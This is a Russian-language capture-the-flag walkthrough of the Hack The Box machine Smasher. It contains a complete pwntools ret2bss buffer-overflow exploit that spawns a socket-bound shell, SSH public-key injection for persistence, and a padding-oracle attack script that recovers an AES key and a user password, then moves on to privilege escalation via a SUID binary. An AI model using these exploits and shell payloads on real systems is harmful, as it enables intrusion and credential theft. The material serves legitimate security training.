166c166
<     sprintf(buf, "HTTP/1.1 200 OK\r\n%s%s%s%s%s",


>     sprintf(buf, "HTTP/1.1 200 OK\r\nServer: shenfeng
tiny‐web‐server\r\n%s%s%s%s%s",
233a234,236
>     int reuse = 1;
>     if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, (const
char*)&reuse, sizeof(reuse)) < 0)
>         perror("setsockopt(SO_REUSEADDR) failed");
234a238,239
>     if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEPORT, (const
char*)&reuse, sizeof(reuse)) < 0)
>         perror("setsockopt(SO_REUSEPORT) failed");
309c314
<     sprintf(buf, "HTTP/1.1 %d %s\r\n", status, msg);


>     sprintf(buf, "HTTP/1.1 %d %s\r\nServer: shenfeng
tiny‐web‐server\r\n", status, msg);
320c325
<         sprintf(buf, "HTTP/1.1 206 Partial\r\n");


>         sprintf(buf, "HTTP/1.1 206 Partial\r\nServer: shenfeng
tiny‐web‐server\r\n");
346c351,355
< void process(int fd, struct sockaddr_in *clientaddr){


> int process(int fd, struct sockaddr_in *clientaddr){
>     int pid = fork();
>     if(pid==0){
>     if(fd < 0)
>       return 1;
377a387,389
>     return 1;
>   }
> return 0;
407a420
>     int copy_listen_fd = listenfd;
417,420c430
<
<     for(int i = 0; i < 10; i++) {
<         int pid = fork();
<         if (pid == 0) {         //  child


>     signal(SIGCHLD, SIG_IGN);
421a432
>
423c434,437
<                 process(connfd, &clientaddr);


>               if(connfd > ‐1)  {
>                 int res = process(connfd, &clientaddr);
>               if(res == 1)
>                       exit(0);
424a439,440
>               }
>
426,437d441
<         } else if (pid > 0) {   //  parent
<             printf("child pid is %d\n", pid);
<         } else {
<             perror("fork");
<         }
<     }
<
<     while(1){
<         connfd = accept(listenfd, (SA *)&clientaddr, &clientlen);
<         process(connfd, &clientaddr);
<         close(connfd);
<     }
438a443
>

Незначительные изменения:
 • добавлена обработка ошибок (233a234, 234a238);
 • в строчках баннеров веб‐сервера появилось имя раз работчика, что
   облегчает атакующему идентифика цию ПО на эта пе сканирования хоста
    (166c166, 320c325).

Важные изме нения: модифициро вана логика обработки запросов клиента
(все, что касается функции process и соз дания форков). Если в tiny‐
github.c реализована многопоточность с помощью концепции PreFork, ког‐
да мастер‐процесс спавнит дочерние в цикле от 0 до 9, то в tiny.c родитель
форкается только один раз — и уже не в теле main, а в самой функции
process. Полагаю, это было сделано, чтобы ослабить нагрузку на сервер —
ведь ВМ атакует множес тво людей одновременно. Ну а нам это только
на руку, потому что дебажить мно гопо точные приложения — то еще удоволь‐
ствие.


Найти уяз вимую стро ку
На одной из моих вузовских практик препода ватель пос тавил такую задачу:
без доступа в Сеть с точностью до строки найти в исходном коде пакета
OpenSSL место, ответс твенное за нашумевшую уяз вимость Heartbleed (CVE‐
2014‐0160). Разумеется, в большинс тве случаев нель зя однозначно обвинить
во всех бедах одну‐единственную стро ку, но всегда можно  (и нужно)
выделить для себя место в коде, от которого ты будешь отталкиваться
при атаке.
  Найдем такую строку в tiny.c. В фор мате статьи трудно анализировать
исходные коды без нагромождения повторя ющейся информации — поэтому
я представлю анализ в виде цепочки «прыж ков» по функциям (начиная
от main и заканчивая уязвимостью), а ты потом сам проследишь этот путь
в своем редакторе.


main() { int res = process(connfd, &clientaddr); } ==> process() {
parse_request(fd, &req); } ==> parse_request() { url_decode(filename,
 req‐>filename, MAXLINE); }

Функция  url_decode  принимает  три  аргу мента:  два  массива  строк
(источник — filename и наз начение — req‐>filename) и количество копиру‐
емых байтов из первого мас сива во второй. В нашем слу чае это константа
MAXLINE, равная 1024.


void url_decode(char* src, char* dest, int max) {
    char *p = src;
    char code[3] = { 0 };
    while(*p && ‐‐max) {
        if(*p == '%') {
            memcpy(code, ++p, 2);
            *dest++ = (char)strtoul(code, NULL, 16);
            p += 2;
        } else {
            *dest++ = *p++;
        }
    }
    *dest = '\0';
}

Алгоритм функции тривиален. Клиент запрашивает у сервера файл. Если
строка с именем это го файла содержит данные в Percent‐encoding (их можно
определить по символу %), фун кция выпол няет декодирование и помещает
соответствующий байт в массив наз начения. В про тивном случае происходит
простое побайтовое копирование. Одна ко проблема в том, что локальный
массив filename имеет размер MAXLINE (то есть 1024 байта), а вот поле
req‐>filename структуры http_request рас полага ет лишь 512 байтами.


typedef struct {
    char filename[512];
    off_t offset;              /* for support Range */
    size_t end;
} http_request;

Налицо классический Out‐of‐bounds Write (CWE‐787: запись за пре делы дос‐
тупной памяти) — он и делает воз можным срыв стека.
  В эпилоге мы посмотрим на ана лиз трас сировки этого кода, а пока
подумаем, как можно использовать уязвимое место tiny.c.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

 В КОРОЛЕВСТВЕ            PWN
           АТАКА RET2BSS, КРИПТООРАКУЛЫ И РЕВЕРС‐
             ИНЖИНИРИНГ НА ВИРТУАЛКЕ SMASHER
                            С HACK THE BOX





Раз работка экспло ита
Сперва насладимся моментом, когда сервер tiny крашится. Так как с ошиб‐
кой сегментации упадет дочерний процесс прог раммы, привычного алерта
Segmentation fault в окне тер минала мы не уви дим. Чтобы убедиться, что
процесс отработал некорректно и завершился сег фолтом, я открою журнал
сообщений ядра dmesg (с флагом ‐w) и запрошу у сервера (несущес твующий)
файл с име нем из тысячи букв A.



  root@kali:~# ./tiny 1111
  root@kali:~# dmesg ‐w
  root@kali:~# curl localhost:1111/$(python ‐c 'print "A"*1000')





          Подтверждение ошибки сег ментации процесса tiny

Класс: видим, что запрос выбивает child‐про цесс c general protection fault (или
segmentation fault в нашем случае).


По иск точ ки перезаписи RIP
Запустим исполняемый файл сервера в отладчике GDB.


             INFO

                       Классический GDB без обвесов по умолчанию
                       следит за выполнением родительско го процес‐
                           са, однако установленный ассистент PEDA будет
                      мониторить дочерний процесс, если при выпол‐
                      нении был форк. Это эквивалентно настройке
                   set follow‐fork‐mode child в оригиналь‐
                     ном GDB.





  root@kali:~# gdb‐peda ./tiny
  Reading symbols from ./tiny...
  gdb‐peda$ r 1111
  Starting program: /root/htb/boxes/smasher/tiny 1111
  listen on port 1111, fd is 3


Теперь важный момент: я не могу пользовать ся циклическим паттерном де
Брёйна, который предлагает PEDA, ведь он содержит символы '%' — а они,
если помнишь, трактуются сервером как начало URL‐кодировки.





  Циклическая последовательность, сгенерированная при помощи GDB
  PEDA

Значит, нам  нужен  дру гой  генератор. Можно  пользоваться  msf‐pat‐
tern_create ‐l <N> и msf‐pattern_offset ‐q <0xFFFF>, чтобы соз дать
последовательность нужной длины и найти смещение. Однако я предпочитаю
модуль pwntools, который работает в разы быс трее.





  Циклические последовательнос ти, сгенерированные при помощи MSF
  и pwntools

Как мы видим, ни один из инс тру ментов не исполь зует «плохие» символы,
поэтому для генерации вредоносного URL можно юзать любой из них.



  root@kali:~# curl localhost:1111/$(python ‐c 'import pwn; print pwn.‐
  cyclic(1000)')
  File not found


Мы отправили запрос на открытие несуществу ющей страницы при помощи
curl — а теперь смотрим, какое зна чение осело в регистре RSP, и рассчи‐
тываем величину смещения до RIP.



  gdb‐peda$ x/xw $rsp
  0x7fffffffdf48: 0x66616172
  root@kali:~# python ‐c 'from pwn import *; print
  cyclic_find(unhex("66616172")[::‐1])'
  568


Ответ: 568.
  После выхода из отладчика хорошо бы принудительно убить все инстансы
веб‐сервера — ведь однозначно завершился толь ко child‐процесс.



  root@kali:~# ps aux | grep tiny | awk '{print $2}' | xargs kill ‐9



Proof-of-Concept
Давай проверим, что мы и правда можем переза писать адрес воз врата про‐
извольным значением. Для этого напишем прос той скрипт на Python, который
откроет удаленный (в нашем случае локальный) сокет и отправит туда строку
вида GET /<ПЕЙЛОАД>.


pwntools для Python 3
Несмотря на то что разработка еще не перенесена в stable‐ветку, я все же
решил ся на эксперимент с pwntools для треть ей версии Python.
   Устанавливается он так.


 $ apt install python3 python3‐pip python3‐dev git libssl‐dev
 libffi‐dev build‐essential ‐y
 $ python3 ‐m pip install ‐‐upgrade git+https://github.com/Gallop
 sled/pwntools.git@dev3





#!/usr/bin/env python3
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python3 poc.py [DEBUG]


from pwn import *


context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64


payload = b''
payload += b'A' * 568
payload += p64(0xd34dc0d3)


r = remote('localhost', 1111)
r.sendline(f'GET /{payload}')
r.sendline()

С работающим на фоне сервером в дебаггере запустим скрипт и убедимся,
что процесс упал с «мертвым кодом» в регистре RIP.





             PoC перезаписи адреса возврата (неудача)

С первого раза не сработало… Что пошло не так? Значение 0xd34dc0d3 упа‐
ковано в формат little‐endian для x86‐64, поэтому на самом деле оно выглядит
как 0x00000000d34dc0d3. При чтении первого нулевого байта сервер упал.
Почему? Потому что он юзает функцию sscanf (строка 278) для парсинга зап‐
роса — а она записывает нашу полезную нагрузку в массив uri, пока не спот‐
кнется о нулевой терминатор.
   Чтобы избежать этого, перед отправкой конверти руем весь пейлоад в Per‐
cent‐encoding с помощью urllib.parse.quote.


from urllib.parse import quote as url_encode
r.sendline(f'GET /{url_encode(payload)}')

Тогда все пройдет как нужно.





              PoC перезаписи адреса возврата (успех)


По луче ние шел ла
Есть несколько вариантов получения сес сии поль зователя, от имени которо‐
го крутится веб‐сервер.
  Первый — это пол ноценная ата ка Return‐to‐PLT с извлечени ем адре са
какой‐либо функции из исполняемо го файла (read или write, к примеру). Так
мы узнаем место загрузки libc и сможем вызвать system с помощью клас‐
сической техники ret2libc. Это в точности повторяет материал третьей части
цикла — только на сей раз нам пришлось бы перенаправить вывод шел ла
в сокет через сишную функцию dup2, а ее нужно вызывать трижды для каж‐
дого из стандартных потоков: ввод, вывод и ошиб ки.
  Функция write, например, принимает три аргу мента с раз мером выводи‐
мой строки в конце — его бы мы загружали в регистр RDX. При этом гаджеты
типа pop rdx; ret не встречаются, так что нам пришлось бы искать альтер‐
нативный способ инициализации RDX. Например, использовать функцию
strcmp, которая помещает в RDX раз ницу сравниваемых строк.
   Это долго и скучно, поэтому, к счастью, есть второй способ. Можно
извлечь преимущество из флага компиляции ‐z execstack — ты ведь пом‐
нишь, что было в Makefile? Эта опция воз вра щает в наш арсе нал древнюю
как мир атаку Return‐to‐shellcode — в частнос ти, Return‐to‐bss.
  Идея проста: с помощью функции read я запишу шелл‐код в секцию
неинициализированных переменных. А затем через классический Stack Over‐
ﬂow передам ему управление — .bss не попада ет под действие ASLR и име‐
ет бит исполнения. В последнем мож но убедить ся с помощью комбинации
vmmap и readelf.





      Демонстрация воз можности исполнения данных в секции .bss


             INFO

                 О классификации  техник обхо да ASLR можно
                      прочесть в пуб ликации ASLR Smack & Laugh Ref‐
                          erence, PDF.


Для второго варианта ата ки пейлоад примет следующий вид.


ПЕЙЛОАД =
    (1) МУСОР_568_байт +
    (2) СМЕЩЕНИЕ_ДО_ГАДЖЕТА_pop_rdi +
    (3) ЗНАЧЕНИЕ_ДЕСКРИПТОРА_socket_fd +
    (4) СМЕЩЕНИЕ_ДО_ГАДЖЕТА_pop_rsi +
    (5) СМЕЩЕНИЕ_ДО_СЕКЦИИ_bss +
    (6) СМЕЩЕНИЕ_ДО_read@plt
    (7) СМЕЩЕНИЕ_ДО_СЕКЦИИ_bss <== прыжок на шелл‐код

Пункты 1–5 задают два аргу мента для функции read — они ложатся в регис‐
тры RDI и RSI соот ветственно. Обра ти внимание: мы не задаем явно количес‐
тво байтов для чтения (третий аргу мент — регистр RDX), потому что работа
с RDX — это боль при построении ропчейнов. Вмес то этого полагаемся
на удачу: во время выполнения RDX обычно хранит достаточно большие зна‐
чения, чтобы нам хватило на запись шелл‐кода.
  В пункте 6 вызываем саму функцию read (через обращение к таблице PLT),
которая запишет шелл‐код в секцию .bss. Финальный штрих (7‐й пункт)
передаст управление шелл‐коду — после того как будет дос тигнута инс трук‐
ция ret в функции read@plt.
  Необходимые звенья ROP‐цепочки можно найти вручную (как мы делали
это в прошлой части), а можно возложить все заботы на плечи pwntools —
тогда конечный спло ит получится весь ма миниатюрным.


#!/usr/bin/env python3
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python3 tiny‐exploit.py [DEBUG]


from pwn import *
from urllib.parse import quote as url_encode


context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64


elf = ELF('./tiny', checksec=False)
bss = elf.bss()  # elf.get_section_by_name('.bss')['sh_addr'] (
address of section header .bss)


rop = ROP(elf)
rop.read(4, bss)
rop.raw(bss)
log.info(f'ROP:\n{rop.dump()}')


r = remote('10.10.10.89', 1111)


raw_input('[?] Send payload?')
r.sendline(f'GET /{url_encode(b"A"*568 + bytes(rop))}')
r.sendline()
r.recvuntil('File not found')


raw_input('[?] Send shellcode?')
r.sendline(asm(shellcraft.dupsh(4)))  # asm(shellcraft.amd64.linux.
dupsh(4), arch='amd64'), 70 bytes


r.interactive()

Пройдемся по самым интерес ным моментам.


bss = elf.bss()
rop = ROP(elf)
rop.read(4, bss)
rop.raw(bss)

Эти четыре стро ки создают цепочку ROP: поиск секции .bss и вызов функции
read с нужными аргументами.


r.sendline(asm(shellcraft.dupsh(4)))

Здесь можно поистине удивиться, на что способен pwntools: за одну строку
на лету он нагенерил ассемблерный шелл‐код со следующим содержимым.





            Генерация шелл‐кода с помощью shellcraft.dupsh

В нашем случае это код для Linux x64 — вер сия и разрядность ОС берутся
из инициализации контекста.
  Метод dupsh генерит код, который спавнит шелл и перенаправляет все
стандартные потоки в сетевой сокет. Нам нужен сокет со значением дескрип‐
тора 4: такой номер присваивался новому открытому соединению с клиентом
(переменная connfd, строка 433) при локальном ана лизе исполняемого фай‐
ла. Это логично, ведь значения 0–3 уже заняты (0, 1 и 2 — стандартные
потоки, 3 — дескриптор родителя), поэтому процесс форка получает первый
незанятый ID — четверка.





              Получение шелла от имени юзера www

Отлично, мы получили сес сию пользователя www. Интересный момент: ROP‐
гаджета pop rsi; ret в «чистом виде» в бинаре не оказалось, поэтому
умный pwntools исполь зовал цепочку pop rsi; pop r15; ret и заполнил
регистр R15 «мусор ным» значением iaaajaaa.


        WWW

                      Эксплоит, для которого роп чейн прописан в хар‐
                       дкоде, можно найти в репозитории.



ОТ ГРУБОГО ШЕЛЛА ДО SSH — ПОРТ 22
Чтобы не мучиться с неповорот ливым шел лом интерактивной оболочки pwn‐
tools, получим доступ к машине по SSH — с помощью инжекта своего откры‐
того клю ча. Но сперва убедимся, что аутентификация по ключу для данного
пользователя разрешена.



  root@kali:~# ssh ‐vvv www@10.10.10.89 2>&1 | grep 'Authentications that
  can continue:'
  www@10.10.10.89's password: debug1: Authentications that can continue:
  publickey,password


Следом сгенерируем пару ключей с помощью OpenSSL и дропнем откры тый
ключ в файл /home/www/.ssh/authorized_keys.



  root@kali:~# ssh‐keygen ‐f user_www
  root@kali:~# cat user_www.pub
  <СОДЕРЖИМОЕ_ОТКРЫТОГО_КЛЮЧА>
  root@kali:~# ./tiny‐exploit.py
  $ cd /home/www
  $ mkdir .ssh
  $ echo '<СОДЕРЖИМОЕ_ОТКРЫТОГО_КЛЮЧА>' > .ssh/authorized_keys


Теперь мы можем авторизовать ся на вир туалке по протоколу Secure Shell.



  root@kali:~# chmod 600 user_www
  root@kali:~# ssh ‐i user_www www@10.10.10.89
  www@smasher:~$ whoami
  www





                Ин жект public‐ключа и захват SSH



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 В КОРОЛЕВСТВЕ PWN
           АТАКА RET2BSS, КРИПТООРАКУЛЫ И РЕВЕРС‐
             ИНЖИНИРИНГ НА ВИРТУАЛКЕ SMASHER
                            С HACK THE BOX





ИССЛЕДОВАНИЕ ОКРУЖЕНИЯ
Оказавшись  внутри Smasher, я под нял на локальной машине простой
питоновский  сервер  и  раз дал  жертве  отличный  раз ведочный  скрипт
LinEnum.sh. Подробнее о передаче скриптов на удаленный сервер можно
прочесть в прохождении October.





  Загрузка и использование LinEnum.sh (крас ным — порядок работы
  с панелями)

Как это часто бывает на виртуалках с Hack The Box, векторы для повышения
привилегий я обнаружил в списке запущенных процессов и листинге файлов
с установленным битом SUID.



  root@kali:~# ps auxww | grep crackme
  smasher    721  0.0  0.1  24364  1840 ?        S    13:14   0:00 socat
  TCP‐LISTEN:1337,reuseaddr,fork,bind=127.0.0.1 EXEC:/usr/bin/python /
  home/smasher/crackme.py





                   Листинг файлов с SUID‐битом

Оба  этих  странных  файла   (crackme.py  и  checker) мы  используем
для повышения до обычного пользователя и рута соответственно.
  Но обо всем по порядку.


PRIVESC: WWW → SMASHER
Итак, к локальному интерфейсу на порт 1337 подвешен загадочный скрипт
на питоне. Убедиться в этом можно с помощью netstat.



  root@kali:~# netstat ‐nlp | grep 1337
  tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LIS‐
  TEN      ‐


Просмотреть содержимое у нас не хва тает прав.



  root@kali:~# cat /home/smasher/crackme.py
  cat: /home/smasher/crackme.py: Permission denied


Посмотрим, что там происходит, пос тучавшись по адресу localhost:1337.



  www@smasher:~$ nc localhost 1337
  [*] Welcome to AES Checker! (type 'exit' to quit)
  [!] Crack this one:
  irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6‐
  togqLYITGGpPsXdg==
  Insert ciphertext:


На первый взгляд это про верялка корректнос ти шифртекста AES.





                       Ручной фаззинг crackme.py

Если поиграть с разными вариациями входных данных, можно получить ошиб‐
ку типа Invalid Padding — она проз рачно намека ет на воз можность исполь‐
зовать Padding Oracle для подбора исходно го текста.


Криптооракулы, или атака Padding Oracle
Padding Oracle Attack — тип ата ки на реализацию алгоритма шифрования,
который использует «добива ние» блоков открытого текста (далее ОТ) до нуж‐
ной длины. Идея в сле дующем: если конкретная реализация криптографичес‐
кого алгоритма плю ется раз ными сообщениями об ошибках в случаях, когда
операция расшифрования прошла пол ностью некоррек тно и когда в ОТ
был получен только некоррек тный padding, сообщение (или его часть)
можно вскрыть без секретного ключа.
   Звучит удивительно, не правда ли? Утечка всего лишь одной детали о ста‐
тусе операции расшифрования ставит под угрозу надежность всей системы.
Недаром криптоаналитики любят повторять: You Don’t Roll Your Own Crypto.
Посмотрим, почему же так происхо дит.
  Добивание — такой прием в криптографии, при котором пос ледний блок
ОТ заполняется незначащими данными до конкретной длины  (зависит
от алгоритма шифрования). Эта процедура приз вана прокачать стойкость
криптоалгоритма к анализу. Добивание — стандартная практика для всех
популярных пакетов крип тогра фического ПО, поэтому различные его реали‐
зации также строго стандартизированы.
  Для алгоритма шифрования AES в режиме CBC правило добивания опи‐
сано в стандарте PKCS#7 (RFC 2315). Он гласит, что пос ледний блок ОТ нуж‐
но добить до 16 байт (AES опериру ет 128‐битными блоками), а значения бай‐
тов, из которых состоит добива ние, определя ется общей длиной padding,
например:
 • если в последнем бло ке ОТ не хватает пяти байт до 16, его дополняют
   пятью байтами 0x05;
 • если в последнем бло ке ОТ не хва тает одного байта до 16, его допол няют
  одним байтом 0x01;
 • если длина последнего бло ка ОТ равна 16, его дополняют 16 байтами
  0x10 (то есть целым «искусственным» блоком).

Когда используется AES‐CBC, знание о корректнос ти дешифровки padding
позволяет восстановить изначальное сообщение без ключа — через манипу‐
ляции с промежуточ ным сос тоянием шифртекста (далее ШТ).





        Дешифровка в режиме CBC (источник — ru.wikipedia.org)

Этот известный рисунок из Википедии прольет свет на ситу ацию: пусть наш
ШТ состоит всего из двух блоков (C1, C2). Тогда, чтобы дешифровать C2
и получить соот ветствующий блок ОТ P2, нарушителю необходимо изменить
один последний байт блока C1 (назовем его C1') и отправить оба блока
на расшифровку оракулу. Вот мы и доб рались до определения: оракул —
это всего лишь абстракция, которая воз вра щает односложный ответ «ДА/
НЕТ» на вопрос о правильнос ти добивания. Изменение одного байта в C1
изменит ровно один байт в P2, так что аналитик может перебрать все воз‐
можные значения C1' (всего 255), чтобы получить истинное значение пос‐
леднего байта P2.
   Это возможно из‐за обра тимос ти операции XOR (^). Рас шифрование бло‐
ка P2 можно описать формулой P2 = D(C2,K) ^ C1, где D(Ci,K) — функция
расшифрования i‐го бло ка Ci ключом K. Если добивание корректно, пос‐
ледний  байт  блока  D(C2,K)   ^   C1'   =   0x01   и,  следовательно,
P2 = D(C2,K) = C1' ^ 0x01. Таким образом мы узнали промежуточное
состояние D(C2,K) (промежуточное — потому что оно существу ет «перед»
финальным XOR с предыду щим блоком ШТ).
   Чтобы теперь найти предпоследний байт ОТ, нужно установить значение
последне го байта C1' равным D(C2,K) ^ 0x2 и повторить всю процедуру
для предпоследнего байта (он превратится в C1'' и так далее). Таким спо‐
собом мы можем полностью вос ста новить один блок ШТ за 255 × 16 =
4080 попыток при худшем раскладе. Алго ритм можно повторять для каждого
последующего бло ка, кроме первого — ведь для него нет предшеству ющего
куска (вектор инициализации неизвестен), из которого мы вос станавливаем
промежуточное состояние. Не так уж и много, верно? По крайней мере,
по сравнению со сложностью 2^128 пол ного перебора ключа…


             INFO

                   Еще один известный пример успешной реали‐
                      зации Padding Oracle — атака на осно ве подоб‐
                      ранного шифртекста (CCA), разработанная швей‐
                      царским  криптографом  Даниэлем  Блайхен‐
                       бахером, на алгоритм RSA с добиванием PKCS#1
                           v1.5. Ее также называют «атакой миллиона сооб‐
                       щений».
                     Ин тересное чтиво про механизм атаки и биб‐
                       лиотека на Python для прак тики.



Раз работка экспло ита
В нашем случае оракулом служит сам скрипт crackme.py — он добровольно
«рассказывает», было ли добивание шифртекста корректным. Я буду исполь‐
зовать готовую либу python‐paddingoracle, которая пре доставляет интерфейс
для быстрой разработки «ломалки» под свою ситуацию.
  Но сперва  я проб рошу SSH‐туннель до своей машины, поскольку
crackme.py доступен только на Smasher (видно из опции socat bind=127.0.
0.1).





                 Проб рос туннеля из SSH‐клиента

Я использую горячие клавиши Enter  +  ~C SSH‐клиента, чтобы открыть
командную строку и проб росить туннель без переподключения. В этом посте
автор приводит интересную аналогию: такие горячие клавиши он сравнивает
с чит‐кодами для видеоигр Konami.
   Теперь я могу задавать «вопросы» оракулу с Kali, обращаясь к адресу lo‐
calhost:1337.
  Сам экспло ит тривиален: за основу я взял при мер с главной страницы
модуля — а для поддержки «общения» меж ду сокетом, где сидит оракул,
и своим скриптом исполь зовал pwntools.


#!/usr/bin/env python
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python crackme‐exploit.py


import os


from pwn import *
from paddingoracle import BadPaddingException, PaddingOracle
from Crypto.Cipher import AES


BLOCK_SIZE = AES.block_size



class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        self.r = remote('localhost', 1337)
        log.info('Progress:\n\n\n\n')
        super(PadBuster, self).__init__(**kwargs)


    def oracle(self, data, **kwargs):
        os.write(1, '\x1b[3F')  # Escape‐последовательность для
очистки трех последних строк вывода
        print(hexdump(data))
        self.r.recvuntil('Insert ciphertext:')
        self.r.sendline(b64e(data))
        recieved = self.r.recvline()


        if 'Invalid Padding!' in recieved:
            # An HTTP 500 error was returned, likely due to incorr
ect padding
            raise BadPaddingException



if __name__ == '__main__':
    ciphertext = b64d('irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0O
XPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==')
    log.info('Ciphertext length: %s byte(s), %s block(s)' % (len(
ciphertext), len(ciphertext) // BLOCK_SIZE))


    padbuster = PadBuster()
    plaintext = padbuster.decrypt(ciphertext, block_size=BLOCK_SIZE,
iv='\x00'*16)


    log.success('Cracked: %s' % plaintext)

Чтобы построить свою «ломалку», необ ходимо всего лишь пере опре делить
метод oracle в классе PadBuster, реализовав таким образом взаимодей‐
ствие с оракулом.





             Процесс вос ста новления откры того текста

Метод decrypt сосредоточен на двух бло ках: восстанавливаемом (P2) и под‐
бираемом  (C1'). Второй блок шифртекста (вос ста навливаемый) остается
неизменным, в то время как первый блок (подбира емый) изначально запол‐
нен нулями. На старте ата ки последний байт первого блока, начиная со зна‐
чения 0xff, уменьшается до тех пор, пока не будет обработано исключение
BadPaddingException. После этого фокус смещается на предпоследний
байт, и все пов торяется заново — и так далее для всех пос леду ющих блоков.





                   От крытый текст восстановлен

Через десять минут у нас есть содержимое всех четырех блоков секретного
сообщения (в последнем блоке, к сло ву, ему до пол ной длины не хва‐
тало 6 байт) с паролем пользователя smasher. Теперь мы можем повысить
привилегии и забрать user‐флаг.
  Отмечу, что нам удалось дешифровать даже первый блок ШТ, так как мы
угадали вектор инициализации. Он,  как будет видно по содержимому
crackme.py, полностью сос тоял из нулей.



  www@smasher:~$ su ‐ smasher
  Password: PaddingOracleMaster123
  smasher@smasher:~$ whoami
  smasher
  smasher@smasher:~$ cat user.txt
  baabc5e4????????????????????????



Со держимое crackme.py
Теперь мы можем читать скрипт crackme.py. Взглянем на содержимое
в учебных целях.


from Crypto.Cipher import AES
import base64
import sys
import os


unbuffered = os.fdopen(sys.stdout.fileno(), 'w', 0)


def w(text):
    unbuffered.write(text+"\n")


class InvalidPadding(Exception):
    pass


def validate_padding(padded_text):
    return all([n == padded_text[‐1] for n in padded_text[‐ord(padded
_text[‐1]):]])



def pkcs7_pad(text, BLOCK_SIZE=16):
    length = BLOCK_SIZE ‐ (len(text) % BLOCK_SIZE)
    text += chr(length) * length
    return text



def pkcs7_depad(text):
    if not validate_padding(text):
        raise InvalidPadding()
    return text[:‐ord(text[‐1])]



def encrypt(plaintext, key):
    cipher = AES.new(key, AES.MODE_CBC, "\x00"*16)
    padded_text = pkcs7_pad(plaintext)
    ciphertext = cipher.encrypt(padded_text)
    return base64.b64encode(ciphertext)



def decrypt(ciphertext, key):
    cipher = AES.new(key, AES.MODE_CBC, "\x00"*16)
    padded_text = cipher.decrypt(base64.b64decode(ciphertext))
    plaintext = pkcs7_depad(padded_text)
    return plaintext



w("[*] Welcome to AES Checker! (type 'exit' to quit)")
w("[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0O
XPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==")
while True:
    unbuffered.write("Insert ciphertext: ")
    try:
        aes_hash = raw_input()
    except:
        break
    if aes_hash == "exit":
        break
    try:
        decrypt(aes_hash, "Th1sCh4llang31SInsane!!!")
        w("Hash is OK!")
    except InvalidPadding:
        w("Invalid Padding!")
    except:
        w("Generic error, ignore me!")

Теперь, получив секретный ключ Th1sCh4llang31SInsane!!!, я могу удос‐
товериться, что сооб щение дешифровано верно.



  >>> import base64
  >>> from Crypto.Cipher import AES
  >>> key = 'Th1sCh4llang31SInsane!!!'
  >>> ciphertext =
  'irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6‐
  togqLYITGGpPsXdg=='
  >>> AES.new(key, AES.MODE_CBC, "\x00"*16).decrypt(base64.b64decode(ci‐
  phertext))
  "SSH password for user 'smasher' is: PaddingOracleMaster123\x06\x06\x06\
  x06\x06\x06"



PRIVESC: SMASHER → ROOT
Окей, настало время апнуть ся до рута. В этом нам поможет тот самый
загадочный бинарь /usr/bin/checker. Пос мотрим, что он умеет.
  Сперва я запущу checker от имени пользователя www.



  www@smasher:~$ checker
  You're not 'smasher' user please level up bro!


Запускаться он хочет толь ко от имени smasher. Хорошо, пусть будет так.



  www@smasher:~$ su ‐ smasher
  Password: PaddingOracleMaster123
  smasher@smasher:~$ checker
  [+] Welcome to file UID checker 0.1 by dzonerzy


  Missing arguments


Теперь не хватает аргумента.



  smasher@smasher:~$ checker snovvcrash
  [+] Welcome to file UID checker 0.1 by dzonerzy


  File does not exist!


Еще более конкретно — checker ждет на вход файл.



  smasher@smasher:~$ echo 'TESTING...' > test.txt
  smasher@smasher:~$ checker test.txt
  [+] Welcome to file UID checker 0.1 by dzonerzy


  File UID: 1001


  Data:
  TESTING...


Все начинает обретать смысл… После некоторого зависания (около секунды)
checker заключил: UID владельца файла — 1001. Очевидно, что под 1001‐м
номером в системе числится сам пользователь smasher.



  smasher@smasher:~$ ls ‐la test.txt
  ‐rw‐rw‐r‐‐ 1 smasher smasher 11 Nov  9 21:07 test.txt
  smasher@smasher:~$ id
  uid=1001(smasher) gid=1001(smasher) groups=1001(smasher)


Еще кое‐что интересное.



  smasher@smasher:~$ checker /usr/bin/checker
  [+] Welcome to file UID checker 0.1 by dzonerzy


  File UID: 0


  Data:
  ELF


Если попросить исполня емый файл проверить самого себя, то в ответ мы
получим, что UID равен 0. Логично: у нас есть доступ к файлу, но его вла‐
делец — root.



  smasher@smasher:~$ checker /etc/shadow
  [+] Welcome to file UID checker 0.1 by dzonerzy


  Access failed , you don't have permission!


Попытка открыть файл, к которо му у нас нет дос тупа, приведет к сооб щению
Access failed, you don’t have permission!



  smasher@smasher:~$ checker /etc/passwd
  [+] Welcome to file UID checker 0.1 by dzonerzy


  Segmentation fault


Наконец, если передать файл большего раз мера, то checker упадет с ошиб‐
кой сегментации.
   Что ж, самое время для небольшой задачи на реверс.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 В КОРОЛЕВСТВЕ PWN
           АТАКА RET2BSS, КРИПТООРАКУЛЫ И РЕВЕРС‐
             ИНЖИНИРИНГ НА ВИРТУАЛКЕ SMASHER
                            С HACK THE BOX





Анализ checker
Перебросим бинарь на Kali с помощью nc для дальнейшего анализа.





               Отправка checker на локальную машину


Играем в реверс‑инже неров
В прошлой статье мы исполь зовали Ghidra в качес тве альтернативы IDA Pro,
да  и  отдельная  статья,  посвященная  сравнению  этих  инструментов,
на «Хакере» выходила. Основная фишка «Гидры» в том, что она предос тавля‐
ет опенсорсный (в отличие от вся ких IDA и Hopper) плагин‐декомпилятор
для генерации псевдокода — а это очень облегчает реверс. Сегодня рас‐
смотрим еще один способ использовать этот плагин.
